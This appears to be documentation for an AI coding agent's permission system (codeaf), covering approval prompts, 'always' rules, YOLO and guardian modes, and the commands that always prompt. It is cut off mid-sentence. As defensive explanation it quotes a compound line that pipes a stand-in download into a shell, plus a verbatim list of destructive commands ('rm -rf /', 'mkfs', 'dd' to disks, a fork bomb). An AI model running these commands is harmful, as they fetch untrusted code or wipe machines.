# What runs without asking, and who can see your files

## The question codeaf asks before it runs a tool — which key allows a command, what `1`, `2` and `3` do

When the model asks to run a tool and the rules say "ask", codeaf blocks that
one call and draws a question above the input box. The call does not run until
you answer, and the conversation is paused on it.

The row above the question is **the call's own transcript row**, re-used rather
than described again — so what you approve is what you read. The question itself
hangs in a frame above the box, with the command on its first row and one row per
answer:

```
╭─ ? needs your ok to run bash ──────────────────────── bash · 7s ─╮
│ rm -rf build · bash pattern "rm -rf *"                           │
│                                                                  │
│   1  allow once                                                  │
│   2  always, this command                                        │
│ ▸ 3  deny                                           safe answer  │
│                                                                  │
╰─ esc later · o other · ? clarify ──────────────────────────╯
```

The tool's own name and the wait mode are the aside in the top edge — ` · 7s`,
or ` · paused` once you have touched it or the reminder ran out, or ` · waiting`
when the countdown is off. Silence is never a no.

**What happens if you just press `enter`?** The pointer is what `enter` takes,
and where it opens depends on how much the call can cost you. On an **ordinary
call** it opens on `1 allow once`, so `enter` runs that one call and nothing
else. On a **grave one** — a call codeaf will always stop you for, such as
`rm -rf *`, a force-push, or anything sent out in your name — the pointer opens
on `3 deny` instead. So `enter` you have not aimed means "allow it once" when the
call can be lived with and "no" when it cannot be taken back. On a grave call the
pointer never opens on the act: allowing is a key you choose — `1`, or `↑` onto
it and then `enter` — and refusing is the one that is already under your hand.

Nothing on a permission is painted in the question's amber except the marks —
the `?`, the pointer and the recommendation — because the command is the thing
you are here to read.

- `1` — allow this one call. The transcript row is annotated `allowed`.
- `3` — refuse this one call. The row is annotated `denied`. The model is handed
  an error result, `denied by the person: <rule>`, and keeps going.
- `2` — the widening yes. What it banks is a separate decision, and on a shell
  command codeaf asks you which shape to bank before it answers.
- `o` — **other**. Write an updated request and press `enter`. The pending
  call is withdrawn, the old turn stops, and the updated request starts in the
  same conversation. This grants no permission.
- `?` — **clarify**. Write your question and press `enter`. codeaf answers in
  context while the original decision stays open. If the clarification needs
  approval, that question comes first; answering it brings back the original.
- `enter` — take the answer the pointer is on: `allow once` on an ordinary
  call, `deny` on a grave one — whichever it is, until you move it.
- `esc` — **later**. The question folds in place to one titled rule, the chip on
  the status line carries its words, and **nothing is answered**. The call stays blocked and the conversation stays
  paused on it. This is the one word here that changed meaning: `esc` used to be
  spelled `cancel` and cancelling meant denying, which was the safe reading when
  the block was a modal nobody could leave.

`d`, `y`, `n` and `a` are not keys on this question. They were the block's keys
before every question in codeaf moved onto one renderer with one key grammar; a
hand that remembers them is answering a question that no longer takes them, so
they do nothing here (`y`, `n` and `a` type themselves into the box). `t` is not
a key on a permission either — it types itself into the box like any other
letter (see **How long an answer lasts** below for why the lifetimes row is not
offered here).

**Typing belongs to the field inside the box.** The question stays visible, and the question is still
there and still answerable the moment the box is clear. `ctrl+c` mid-turn — which
a blocked call always is — interrupts the blocked call exactly as it always has.

**A key pressed in the first quarter-second is dropped.** A question that lands
under a hand already moving would otherwise be answered by a keystroke aimed at
the sentence you were typing.

**`o` and `?` work before you move through the options.** They open a text field
inside the box after the initial quarter-second guard. Other letter shortcuts
still require aiming at the question. A draft you are already typing keeps its
letters. `1`, `2` and `3` always take the corresponding answers.

`[2]` is only drawn, and only acts, when the question is one that can bank an
answer. Every approval question is about a TOOL and can, so every one of them
offers it.

**It does not have to be answered in this window.** A conversation stopped on
this question says so on **home**, with the same three answers on the row —
`1 allow once`, `2 always`, `3 deny` — so a question raised in a terminal you are
not looking at can be answered from the dashboard (home's own page states the
limits, and what `2 always` banks when it is pressed there).

When questions from different steps are waiting, a `N more` line appears under
the one on screen; they are answered oldest first, and each gets its own
countdown when it reaches the front. **Approvals the same step asked for are not
a queue** — they are one frame (the next section).

## What does "safe answer" mean beside deny — the grey words on the refusal

`3 deny` carries a dim **`safe answer`** at the right of its row. It names the
answer that loses nothing: take it and the call does not run, nothing is written,
and the model is told it was refused — you can always allow it next time it asks.

**It is on every approval, ordinary ones included** — not only the grave ones,
and not only when the pointer happens to be sitting there. Nobody but you may
answer an approval, so nothing is allowed to recommend anything on one, and this
mark is what stands in for a recommendation: it says where your way out is. That
is worth most precisely when the pointer is on `1 allow once`, which is where an
ordinary call opens.

Where an asker DID recommend an answer you see **`◆ recommended`** on that row
instead, and never both — two marks each claiming the pointer would be two
answers telling you they are the one to take.

On a terminal too narrow to draw the frame — under about sixty columns — the
sheet has room for neither aside except `◆ recommended`; see *The approval
question on a phone-sized terminal*.

## Several approvals at once — approve all of these, allow all, deny all, one by one

When one batch of calls needs your ok more than once — four reads outside the
project, say — they arrive as **one frame**: what each call wants, then three
answers.

```
╭─ ? allow these 4? ───────────────────────────────────────── read ─╮
│ read  ~/notes/plan.md                                             │
│ read  ~/notes/todo.md                                             │
│ read  ~/notes/ideas.md                                            │
│ read  ~/notes/log.md                                              │
│                                                                   │
│ ▸ 1  allow all 4                                                  │
│   2  one by one                                                   │
│   3  deny all                                       safe answer   │
╰─ esc later · o other · ? clarify ───────────────────────────╯
```

- **`1 allow all 4`** gives every one of them its own `allow once`, in one go.
- **`3 deny all`** gives every one its own `deny`. It is the answer that loses
  nothing, and on a terminal wide enough to draw the frame it says `safe answer`
  on its row — whatever the pointer is on, because it is telling you where your
  way out is, not where you are standing.
- **`2 one by one`** answers nothing: it opens the same approvals as tabs, where
  `←` `→` move between them and the last tab sends them all (questions.md,
  *Several questions at once*).
- **`esc`** puts all of them off; the work stays waiting.

Each leaves its own receipt. There is no `how long` here, for the reason a
single approval has none (*How long an answer lasts*). **An irreversible call
never joins the frame**, and neither does an approval from another step.

## If I press enter on a frame of approvals, does it allow all of them or deny them all

It allows them all, on the ordinary calls a frame is made of. The pointer opens
exactly where those same calls asked one at a time would put it — the rule is in
*The question codeaf asks before it runs a tool — which key allows a command,
what `1`, `2` and `3` do*, read over the whole frame rather than written a second
time here — so four reads, being **ordinary calls**, open on `1 allow all 4`, and
`enter` on a frame you have not moved allows all four once.

The frame opens on `3 deny all` instead when one of its approvals carries a
**recommendation of its own** that is not the plain grant: the frame may not make
`enter` mean yes where any single one of its questions, asked alone, would not.

A **grave** call — one codeaf always stops you for — never reaches a frame at
all. It is asked on its own, every time, with the pointer on `deny`.

## I pressed ctrl+t while it was asking — where did the question go, and did my typing answer it

The question stays open and unanswered in the chat you came from. The **New chat**
start page takes every key while it is on screen: letters and digits go into its
first-message box, `enter` starts the new conversation, and `esc` returns to the
chat behind it. Nothing typed on that page can allow, deny, postpone or otherwise
answer the waiting question.

The question block is not drawn on the start page because its answer keys do
nothing there. The chat that is asking keeps `?` on its tab, and its row on the chats
card (`alt+k`) says `asking you something`. Press `esc` or select that chat to go back; the same
question returns with its numbered answers live.

Walking away does not turn silence into a no. If an approval countdown reaches
expiry while its question is behind the start page, it pauses instead of denying
the call. The unanswered question is still there when you return, with `paused`
on its row.

## What the permission frame does on a narrow terminal

A permission is always the **frame**, at every width down to the phone sheet —
there is a command to read before you allow it, and a question with something to
read is never squeezed onto one row. What narrows is the frame, not the form.

At about seventy columns and up it is drawn whole:

```
╭─ ? needs your ok to run bash ─────────────────────────────── bash ─╮
│ bash · bash pattern "rm -rf *" · codeaf                            │
│                                                                    │
│   1  allow once                                                    │
│   2  always, this tool                                             │
│ ▸ 3  deny                                             safe answer  │
│                                                                    │
╰─ esc later · o other · ? clarify ────────────────────────────╯
```

The bottom edge carries `esc later · o other · ? clarify`. Nothing is drawn
under the box. `o` and `?` work before you move through the answers and open their
text field inside it. Arrows, Tab and the wheel over the box cycle through the
answers in both directions; Enter and the numbered answers still work. The seam
omits its duplicate yellow decision text while the permission box is open.

The command itself **wraps** rather than being cut, and says so with `…` if even
the wrap was not enough. An answer is never dropped at any width: an offer with
an answer missing is an offer that hides an answer.

## The approval question on a phone-sized terminal

Under about sixty columns the frame becomes a **bottom sheet**, because a digit
is three cells for a thumb that covers ten:

```
─── ? bash ───────────────────────────────────────────
 needs your ok to run bash
 bash pattern "rm -rf *" · codeaf
──────────────────────────────────────────────────────
   1  allow once
   2  always, this tool
 ▸ 3  deny
 ↑↓ choose · enter take it · esc later
```

Two plain rules instead of a box, the head and the command between them, and the
answers under. The pointer is the same pointer and it opens where the wide frame
opens — `allow once` on an ordinary call, the answer that loses nothing on a
grave one — so `enter` here does exactly what `enter` does there.

**The sheet carries no `safe answer` mark**, and there is no `allow all` here
either: at this width a batch of approvals is not drawn as one frame at all, and
you answer the one on the sheet, then the next. The asker's `◆ recommended` is
the only aside a sheet has room for. Widen the terminal past about sixty columns
and the frame, the mark and `allow all N` come back.

Each answer is a **band the full width of the sheet** — the whole row is the
target, not just its key. The clock, where a question has one, keeps its own
corner, bottom right and off the bands, so reaching past it cannot answer; the
queue count sits beside it. Every row of the sheet swallows a press, so a press
that misses a band cannot reach the transcript underneath it.

`esc` is still *later* from the keyboard and has **no band**: folding a question
away is not an answer, and a full-width target that looked like one would be
read as the no.

## What is left where the question was: the receipt

An answered question leaves one dim line where it stood:

```
  ✓ needs your ok to run bash → allow once · you · 14:02 · c change · ◐ working
```

It is the same sentence the model reads in `the record`, so what you saw and
what it was told cannot become two accounts of one decision. It stays for about
half a minute and then it is history — the transcript row keeps its own
annotation for good.

**`u undo` on that line takes the permission back**, and it appears there as soon
as you answer one `always`:

```
  decided needs your ok to run bash → always · you · 14:02 · u undo · c change
```

While the receipt is on the screen and your box is empty, `u` hands the standing
yes back whole — this conversation stops remembering it, the line it saved in
your settings goes, and a connected account's capability that the yes switched on
goes back to asking. It asks you nothing, and the row it leaves says `taken back ·
this tool asks again`. **A shell `always` is the one exception**: the rule it saved
is about a command shape rather than a tool name, and the receipt does not know
which line it wrote, so `u` takes back this conversation's own memory and says
`taken back for this conversation · the saved command rule is in /permissions` —
which is where that line is removed for good.

`c change` on the same line asks you the same thing again instead, for when the
answer you want is `allow once` rather than nothing at all.

A question the asker took back says so once instead, and the chip's count drops:

```
  ⊘ needs your ok to run bash — no longer needed · the turn moved on without it
```

## Answering a question you put off — the chip

`esc` folds a question rather than answering it, so the status line carries a
chip for as long as anything is open:

```
? 1 question · alt+y
```

`alt+y` raises the newest open question from **any page** — home, a room, the
sessions place — and takes you back to the conversation it belongs to. The count
includes the ones you folded: `esc` is later and not cancelled, so a question you
put off is still a question the work is waiting on.

## Why did it ask my permission before running that — the dim line under the offer

The dim line beneath the offer is the rule that produced the question, in the
rules' own words. It can read:

- `default`
- `default (unset)`
- `tool "edit"`
- `bash pattern "rm -rf *"`
- `critical command "rm -rf /"`
- `<tool> acts in your name outside this machine`
- `you said yes to "<phrase>"`
- `"<phrase>" is set to ask first`

The same sentence is what the model is told when a call is refused.

## The countdown: silence waits — why an unanswered approval is not denied, and whether an approval question expires while you are in another chat

A question that is not answered stays a question. Silence is never a **no**.

The reminder is **10 seconds** by default. The setting is
`approval.timeout_seconds`, labelled "approval countdown" in `/settings`.

At expiry codeaf **pauses** and keeps waiting — it never denies the call, and
it never allows it. The offer tail reads `paused` (or `waiting` when the
countdown is off) and the work stays blocked until you answer. The transcript
row is not annotated `denied · no answer`; that wording was a previous build
answering no for you.

Any key the question reads, and any press on its answers, stops the clock
**permanently**. There is no way to start it again; the tail then reads
` · paused` and the question waits for you. Setting the countdown to `0` turns
the clock off from the start, and every question waits forever.

The clock **only runs while that terminal window has the keyboard**. Switch to
another window and it stops where it is; come back and it starts again from the
full 10 seconds. See "Does my other window keep working when I switch away".

The clock is drawn in whole seconds. The wait mode is on the tail so what
silence will do is not hidden.

## Does my other window keep working when I switch away — why my other session looked frozen

Yes, and this used to be the one thing that stopped it.

The work itself never depended on you looking. A turn runs in the session, not
on the screen: the model keeps streaming, tools keep running, and tasks keep
going whether the window is in front of you, behind another one, or on another
desktop. Nothing about drawing the picture is tied to which window has focus.

The approval countdown was the exception, and it is fixed. It used to run on a
window nobody was looking at, so a session that hit the gate ten seconds after
you walked away had that call **denied** — by a clock you could not have beaten,
about a question on a screen behind you. The model was handed a refusal, tried
something else, was refused again, and the session you came back to had spent
your absence getting nowhere. That is what "my other window stopped working"
was.

Now the countdown is a clock about **reading**, not about wall time. It is held
for as long as the window is unfocused, and starts again whole the moment you
come back — so a question you never saw is still there when you get to it.

**And the same is true of a conversation you switched away from inside this
terminal.** A conversation you have switched away from holds its approval
question for as long as you are away. A task it proposed still starts by itself
after its countdown, and a sign-in offer still lapses after five minutes — both
say `waiting on you` on home until they do. Coming back gives you the reading
time you had left rather than a fresh clock, and only for a question the session
is still asking: one answered or cancelled while you were away is not put back
on the screen.

Two things tell you a window is waiting while you are elsewhere:

- **A desktop notification**, sent the instant the question goes up. The banner
  is headed `codeaf` and reads `<conversation> · waiting on you`.
- **Home**, and every other codeaf window, where the session's row wears `?`,
  reads `waiting on you`, and sorts to the top of its project. The status line
  says it too, as the `· 1 waiting` half of `2 open · 1 waiting`.

If your terminal does not report focus to the programs inside it, codeaf
assumes the window is focused — so the countdown runs, and at expiry it pauses
rather than answering no, and no banner is sent. There is no setting for
either; both are on.

## Why did my session stop after I switched windows — what to check

Work does not stop because you looked away, so if a session really is going
nowhere, it is one of these:

- **A question is up.** The most common one. The answers row under the call
  reads `allow?`; the call is blocked until you answer, and the countdown is held
  while you are away rather than answering for you. If you pressed `esc` on it,
  it is folded to the chip — `? 1 question · alt+y` on the status line — and the
  work is still waiting on it.
- **A call was already denied while you were gone** on a build from before
  silence stopped answering no. The row says `denied · no answer`. Say so and
  the model will ask again. A current build does not write that; the question
  is still up.
- **The turn finished.** A turn that ends on an unfocused window sends its own
  desktop banner, `<conversation> · turn done`.

Nothing here is a pause you can resume: codeaf has no key that suspends a
session and none that wakes one.

## How long an answer lasts: once, this session, or written down — how to make it stop asking every time, stop asking me for this, remember this

**On a permission, the lifetime is the answer you press, and there is no
separate row for it.** `1 allow once` is once, `2 always…` is the widening yes,
and what `2` banks is the whole of the decision — the sections below say exactly
how wide each shape is. codeaf draws no lifetimes row on a permission frame and
`t` does nothing there, because the gate reads the answer key and nothing else:
a row that let you pick `for this project` and then quietly granted one call
would be this surface making a promise about safety that nothing behind it keeps.

Some other kinds of question do carry a row of lifetimes under their answers —
drawn in your own words with a tick on the one that is on, walked by `t how
long`, starting on **just this once** always. Pressing `t` changes that row and
nothing else: nothing is written and nothing is answered until you give an
answer, so you can cycle it, press `esc`, and have written no rule.

Where that row is drawn, **two things are never offered on it**: a lifetime the
question did not itself offer — only the asker knows whether a rule for this
shape can be written at all — and any lifetime at all on something
**irreversible**, which is asked about every single time, the row absent rather
than refusing.

- **Once** — `1` and `3` answer this call and nothing
  else. `esc` answers nothing at all: it puts the question off.
- **For the session** — a "stop asking" answer is kept in memory for the rest of
  this agent's life. It is deliberately coarse: it answers for **the whole
  tool**, so a session memo about bash covers every bash command the rules would
  have asked about. It is written nowhere on disk.
- **A written rule** — when always banks a real rule, codeaf writes it into your
  settings *before* the answer is delivered. Because a real rule now exists, no
  session memo is written. The consequence is worth knowing: the next call goes
  back through the rules, and if the shape you picked is narrower than you
  expected, you will be asked again.

A "no, and stop asking" is kept as a session memo only. **The card never writes
a deny to disk.** A standing never is a line you type into the settings sheet on
purpose.

An answer whose scope cannot be read is treated as **once** — the narrow reading
is the safe one.

## What "always" means when you press `2`: what "always" banks, and how wide the rule is

Pressing always is not one decision. On a shell command it is two.

For `bash`, and only for bash, pressing `2` **does not answer yet**. It replaces
the answers row, in place, with the shapes the rule could be written as:

```
always? 1 git status*  ·  2 git *  ·  3 just this line  ·  esc never mind
```

So pressing always on `git status` can bank `git status*`, or `git *`, or the
single line `git status` — and `git *` is every git command you will ever run.
**You are choosing how wide the rule is.** Whatever you pick is exactly what is
written; nothing widens on its own.

- `1`–`9` pick a shape.
- `esc` backs out of the beat and puts the original question back exactly as it
  was. It answers nothing — and this is the one place `esc` does not mean *later*,
  because what is on screen is a step inside an answer.
- The digits are the **beat's**, not the question's: while it is up, `3` is the
  third shape and not `deny`. The row under your eyes is the shapes.

The last entry always reads `just this line`. It is the command line itself,
named rather than reprinted so the command is not on screen twice.

If only one shape can be derived, or none, there is no second beat and the
answer is sent straight away. A command whose arguments never arrived whole
derives nothing and writes nothing.

For every other tool, always banks the tool. The word on the key says which of
the three you are getting: `always, this command` (bash), `always, this tool`,
or `always, this tool (session)` when there is nothing to write to and the
answer lasts for this agent's life only. On a narrow frame the ` (session)` is
dropped before any answer is.

## The shapes offered for a shell command, exactly

Given one command line, codeaf offers up to three shapes, in this order:

1. **The verb run, plus `*`** — the leading run of plain command words, joined,
   with `*` appended. `git status --short` becomes `git status*`. Offered only
   when that run is at least two words.
2. **The program, plus ` *`** — the first word, a space, then `*`.
   `git status --short` becomes `git *`. The space is deliberate: `git*` would
   also match `gitleaks` and `git-lfs`.
3. **The line itself**, trimmed. Always last.

A verb run stops at the first word that is not a bare word — a flag, a path, a
quote, a wildcard, an assignment. A bare word is a letter followed by letters,
digits, `-`, `_` or `.`.

The list is capped at three, and when it is trimmed the cut is taken out of the
middle, so the plain line always survives as the last entry.

Four shapes are never offered:

- one that pins no word down (all wildcards and punctuation);
- one whose only word is `sudo` or `doas`;
- anything at all derived from a **compound** line — an allow rule can never
  fire for one, so there is nothing honest to offer;
- one containing a control byte.

## Where a banked "always" goes, and when it starts working

A tool always writes `<tool>:allow` into `tools.approval` in your own profile
settings. A bash always appends `allow <shape>` to `tools.bashPatterns`.

The write goes to your **profile only**. A repository's `.codeaf/config.json` is
never written from here. Because a repository that answers `tools.approval`
replaces your whole row at launch, a preference banked here takes effect
everywhere except inside that repository.

The new rule bites on the very next call rather than waiting for another launch.
Under `--no-host`, the running session's gate is rebuilt from the profile at once.
On a plain launch through this machine's engine, the rule is written and the engine
rebuilds its running gate from that profile before the answer is applied, so the next
matching call is allowed. The row then says, literally:

```
always · saved — /permissions to change
```

If the write failed, the row says `allowed` instead, and the failure is dropped
silently.

A bash always refuses, and says so, when:

- the shape is compound —
  `a compound command cannot be remembered: an allow answers for one whole command`
- it names no command — `"<x>" names no command to allow`
- the existing settings row does not parse —
  `settings row "tools.bashPatterns": …`. A malformed row is never clobbered.
- the row already answers this command with a deny or a prompt —
  `settings row "tools.bashPatterns" already answers this command with deny ("rm -rf *")`

A shape the row already allows is a silent no-op: pressing always twice leaves
one rule. Pressing always on a tool already set to the same action writes
nothing.

A stored glob is stored as a glob. `ls *.go` approved becomes `ls *.go` allowed,
wildcard and all — the dialect has no escape for `*`.

## The approval modes, and the default — does changing "ask before running" affect the conversation I am in

`tools.approvalMode` decides what happens when the model asks to run a tool and
nothing more specific applies. It is in `/settings`, under **Safety**, on the row
labelled **"ask before running"**.

| value | what it means |
|---|---|
| `prompt` | ask you |
| `allow` | run it. **This is the interactive default, shown as YOLO.** |
| `deny` | refuse it |

The row's own hint reads: "what happens when the model asks to run a tool:
prompt asks you, allow runs it, deny refuses it. Dangerous shell commands are
asked about whichever way this is set. A change reaches this conversation
straight away, unless the panel says it lands on the next session."

**Cycling the row changes the gate you are already behind — or says it could
not.** The rules are rebuilt from this row and the two under it on the same
keystroke, the `◇` cell on the legend moves with them (and the `YOLO` badge on
the status line, where the legend has no cell — never on the welcome box), and `/status` says the posture
in words under `approvals`. There is no turn to wait for.

**A conversation that set its own posture keeps it.** `alt+a` and a press on the
approvals cell give this conversation a posture of its own (the next section).
The settings rows apply to conversations without their own saved posture.

Where the running gate cannot be reached, the row is still saved and the panel
says, under the list:

```
saved · from the next session
```

and this conversation keeps the gate it has, badge included: the badge follows
the gate in force, never the file. That is the answer on a plain launch, where
this machine's engine holds the conversation and there is no take-back door to
its gate — the same answer `/permissions` gives when it drops a rule.
`--no-host` lands the change at once; over `--host` the gate is the far
machine's.

## Default YOLO in interactive conversations and headless runs

Interactive conversations without a saved approval choice start in **YOLO**,
including conversations over `--host` and `--at`. Saved profile, project and
conversation choices still win. YOLO permits ordinary destructive work without
asking, including file overwrites, `rm -rf build`, `git reset --hard` and
`git clean -fdx`. Critical machine-damaging commands still ask; this is not a
blanket safeguard for your project files.

Headless `--once` runs default to asking, which refuses a call needing consent
because no person can answer. Explicit approval settings, including saved
conversation choices, still apply. Local `--yolo` explicitly opens the ordinary
gate; over `--host` or `--at`, configure approvals on the engine machine.
Tool-specific rules and critical-command checks remain in force in every mode.
The `--yolo` launch flag also controls unattended execution and its limits;
the interactive default only changes approvals. A headless connection cannot
reuse an already-open interactive conversation (or vice versa); close that
conversation before retrying in the other mode.

A persisted value codeaf does not recognise still reads as `prompt`. A garbled
setting must never be the one that opens the gate.

**No gate row can be pinned by an environment variable.** This is deliberate: a
tool gate that a stray export could widen to "allow everything" is a gate with a
bypass.

## Per-tool exceptions — how do I make it never touch a file, or never run a tool at all

`tools.approval` overrides the blanket mode for named tools. It is the
`/settings` row **"tool approvals"** — empty it reads `none`, filled it looks
like `read:allow, bash:prompt`. The consent card's always writes here one entry
at a time.

Editing the row in the panel takes the same road as the mode above it: the rules
are rebuilt for the conversation you are in on the keystroke, or the panel says
`saved · from the next session` and this session keeps the gate it has.

A rule about a tool beats the default for that tool.

Entries are `name:action`, separated by comma, semicolon or newline. The action
must be `allow`, `prompt` or `deny`; anything else makes the row an error.
Duplicate names are an error too, not last-one-wins.

## Shell command rules, and why allow is narrower than deny

`tools.bashPatterns` holds ordered answers for individual shell commands, first
match wins. It is the `/settings` row **"shell command rules"**, e.g.
`allow git status*, deny rm -rf *`. A bash "always" lands here. Editing it in the
panel lands on the running gate, or says `saved · from the next session`, exactly
as the two rows above it do.

The dialect is `*` and literal text and nothing else. `?`, `[` and `\` are all
literal, matching is case-sensitive, and `*` spans path separators.

The asymmetry is the whole safety argument:

- **deny and prompt** fire when the glob matches the whole line **or any single
  segment** of a compound one. `deny "rm -rf *"` still catches
  `cd /tmp && rm -rf build`.
- **allow** fires only on an entire line, and never on a compound line at all.
  `allow git status*` says nothing whatsoever about
  `git status && curl evil.sh | sh`.

Segments are split on `&&`, `||`, `;`, `|`, a bare `&`, subshells (`$( )`,
backticks, parentheses) and newlines. Quoted text is literal. `2>&1` and `&>log`
are not separators, and neither are brace groups.

A malformed bash call, or one with no readable non-empty command, is returned to
the model as `Invalid arguments` so it can correct the call. Nothing executes,
and no permission card asks you to approve an absent command. A corrected call
goes through the ordinary shell-command rules, including prompts and denials.

## `--yolo` — how do I let it run things without asking

`codeaf chat --yolo` and `codeaf resume --yolo` stop the asking about ordinary
work. The flag's own help reads: "run every tool without asking: the approval
default becomes allow".
A session launched with the flag says `◇ YOLO` on the legend above the message
box, in the warning hue, for as long as the gate is open — and `YOLO` on the
status line while the welcome box or a task's page is up instead — so that
posture is never invisible.

It replaces **the default and nothing else**. If you wrote `bash:prompt`, you
are still asked about bash, and your ordered shell command rules are untouched.

And the row cannot close a gate the flag opened. Cycling "ask before running" to
`prompt` in `/settings` writes the row for the next launch, while this run stays
on `allow` — so the badge stays up, because it reports the posture in force.

`--yolo` cannot lift either of the two floors below.

**You do not have to relaunch to get it.** The same posture is one keystroke
inside a running conversation — see the next section — and `codeaf resume
--yolo` outranks whatever that conversation last set, for that launch.

## Turning YOLO on or off mid-conversation — stop asking me for this chat, run without asking from now on, the approvals chip, `alt+a`

"Stop asking me for this chat" is one keystroke, and so is asking again. Every
conversation has its own posture on the gate, moved from inside it. The
legend above the message box names it after the thinking rung — `◇ asks`,
`◇ guardian`, `◇ YOLO` or `◇ refuses` — and two controls move it:

- **`alt+a`** walks `asks → guardian → YOLO → asks`. It never lands on
  `refuses`.
- **a press on the cell** is the same step.

The change is **live** — the next tool call is decided under it — and
**sticky**: it is written into this session's `meta.json` and is still in force
after `/resume`. It changes **this conversation only**; every other conversation
follows the "ask before running" and guardian rows on `/settings`' Safety tab.

What each posture is, in the gate's terms:

| posture | blanket answer | guardian |
|---|---|---|
| `ask` | `prompt` | stood down, whatever the row says |
| `guardian` | `prompt` | standing in |
| `yolo` | `allow` | — |
| `deny` | `deny` | — |
| `auto` | the rows as they stand | the row as it stands |

Your named exceptions, your shell command rules and both floors below are the
same at every posture: `yolo` here is exactly `--yolo`, built by the same code.

Over `--host` the posture is set on the engine machine, whose gate it is, and
the word on your legend is the one that machine resolved. An engine too old to
have the door says so when the connection opens; the cell is then a reading of
the far machine's row and every door answers: "what runs without asking is decided on the machine the conversation runs on — its engine has no dial for this window · change it in that machine's /settings".

## The guardian: a model answering the easy ones for you

`/settings` has a **"guardian"** row, `off` or `on`. The default is **off**.

Turned on, a small model is asked whether one call is plainly safe. It sits
after the rules have said "prompt" and after any session memo, just before you
would see the question.

It can only ever turn a prompt into an allow. It never denies, never widens an
allow, and never sees a call the rules refused. Its whole instruction is a
binary contract: it must answer the single word `ALLOW` or `ASK`. Any other
reply, an error, an interrupt, or a model it cannot resolve all fall through to
you. The arguments it is shown are clipped at 2000 bytes, and it sees no
transcript at all.

**It can never approve something the rules above refuse**, and it never stands
in for you on a call that acts in your name. It does not run on the early-start
path.

**It is the one thing codeaf asks that really does hold the work up**, and it says
so while it does. Everything else a turn asks on your behalf — the memory lookup,
the judges, the reader of a long answer — runs beside your answer and can never
delay it (*Screen*). This one decides whether the command runs at all, so there is
nothing for it to run alongside. It answers in **ten seconds or not at all**, and
for the whole of that the status line reads
`checking whether this is safe to run`. Past ten seconds it falls through and you
are asked, exactly as if it had said `ASK`.

## The floor nothing lifts: dangerous shell commands

A short table of shell shapes is asked about **whichever way your settings are
set**. A blanket `allow` does not switch it off. `--yolo` does not switch it
off. A pushed policy cannot widen it.

The entries, verbatim:

`rm -rf /`, `rm -rf /*`, `rm -fr /`, `rm -fr /*`, `mkfs*`, `dd *of=/dev/*`,
`*>/dev/sd*`, `shutdown`, `shutdown *`, `reboot`, `reboot *`, `halt`, `halt *`,
`poweroff`, `poweroff *` — plus the fork bomb, matched with all whitespace
removed and reported to you as `:(){:|:&};:`.

Before matching, the line is normalised: runs of whitespace collapse to one
space, the gap after `>` closes (so `> /dev/sda` and `>/dev/sda` are the same
thing), and a leading `sudo` or `doas` is dropped (so `sudo reboot` reads as
`reboot`).

The `/*` entries deliberately over-fire: they catch
`rm -rf / --no-preserve-root`, and they also catch plain `rm -rf /var/tmp/x`.

**The table is a floor under allow only.** It turns an allow into a **prompt**,
with the rule `critical command "rm -rf /"`. It is never a refusal of its own:
an explicit deny still denies, and an existing prompt still prompts.

This is a floor, not a sandbox. It is not an attempt to enumerate every way a
shell can ruin a machine.

## The floor nothing lifts: anything acting in your name

Calls that leave this machine in your own name are asked about even under a
blanket allow.

The named table is exactly three tools: **`gmail_send`**, **`calendar_create`**
and **`slack_send`**.

Beyond those, any tool whose name ends in **`_request`** — the raw call a
key-connected account brings, such as `stripe_request` — is judged by its verb.
A `GET`, or no arguments at all, is a read. Every other method acts. **An
argument payload that cannot be read counts as one that acts**: the safe reading
of "I do not know" is the one that asks.

A served tool that the account did not mark read-only is included too.

A blanket allow — the settings row set to `allow`, or `--yolo` — becomes a
**prompt**, with the rule `<tool> acts in your name outside this machine`.

The floor holds under the **default**, and it yields to a rule that **names the
tool**. `gmail_send:allow` in `tools.approval` runs it silently. So does a
capability set to `yes`. So does a remembered "always" answer. Nothing else
lifts it.

## Neither floor can be swallowed by "stop asking me"

Before any session memo is consulted, codeaf asks whether the call is one of the
two floors. It returns true for anything acting in your name, and for a bash
call matching the critical-command table.

Both bypass the memo entirely and put the question to you **every time**. One
approved `git status` plus "stop asking me about bash" cannot quietly run
`rm -rf /` for the rest of the session.

It is deliberately not the whole rule set asked over again — only those two. A
bash call whose command cannot be read is not on this list, because the rules
already turned it into a prompt of its own.

## Who can see or view my files — privacy, file access and workspace visibility, what codeaf can read without asking, does git status need approval

**Privacy: who can see my files.** Even in `prompt` mode, a look is not
a question. codeaf can read and open these files without asking — the policy
itself allows these without a card, even before the seeded row below is applied:

- **`read`, `ls`, `grep`, `find`** — they change no file.
- **`tasks` when it is a look** — a search, or one task's page. `say`,
  `continue` and `resolve` follow the blanket mode, because they write into a node.
- **`services` and `use_service`** — the first only lists accounts; the second
  has its own connect card as the one question about connecting, and every tool
  it brings is judged when called.
- **`git status`** and its flags (`git status --short`, `git status --porcelain`)
  when no shell-command rule list has been written. A compound line
  (`git status && curl …`) still asks. A pattern you wrote still wins.

A written `read:prompt`, `services:prompt` or `use_service:prompt` still asks
about that tool. A deny-everything blanket still denies. A Policy with nothing
configured still asks — "no settings" is not the shipped default.

## Other tools that run without an approval question by default

Some tools this build never had a reason to ask about are also seeded as `allow`
underneath whatever you wrote:

- **Reads of this machine** — `read`, `grep`, `find`, `ls`.
- **`jobs`**, whose list and output are reads of processes you already started.
  Its kill is **not** on the floor; that inherits the blanket mode.
- **The agent's own bookkeeping** — `remember`, `track` and `recall`. These
  write to and read from the working state codeaf keeps for itself.
- **`manual`**, which reads pages compiled into this binary and touches no disk
  at all. Asking you to approve codeaf looking up its own documentation would be
  asking about the wrong thing.
- **`settings`**, which reads your own settings rows back through the registry.
  It is `manual` one file over: "what is my daily budget" is a lookup, and the
  credential rows read masked, so a question would be protecting nothing.

**`commit` is deliberately not on it.** It is the one bookkeeping tool that
declares a tracked subgoal finished, and a session that can mark its own work
done without anyone being asked is a session that can talk itself into done.

**`change_setting` is deliberately not on it either**, and for the same reason
one step further out. Changing your configuration writes a file that outlives
the conversation, so it goes to you like `edit` and `write` do. That split is why
the settings pair is two tools rather than one with a read action and a write
action: a rule is written per **tool name**, so a single tool could not have been
free to read and asked about to write.

A rule you write about one of these tools still wins for that tool. What the
floor removes is only the silent part: a rule written about one tool now says
nothing whatsoever about any other.

Nothing on this list acts outside this machine, so it changes neither of the two
floors above.

## The settings codeaf refuses to change for you

codeaf can change your settings when you ask — `settings` reads the rows,
`change_setting` writes one permanently into your profile. Some rows it will not
write, however you ask, and the reason is the plainest one there is: **a model
that can widen its own restraints has none.** It does not take bad intent, only
a short road — asked to stop being interrupted, the shortest thing to reach for
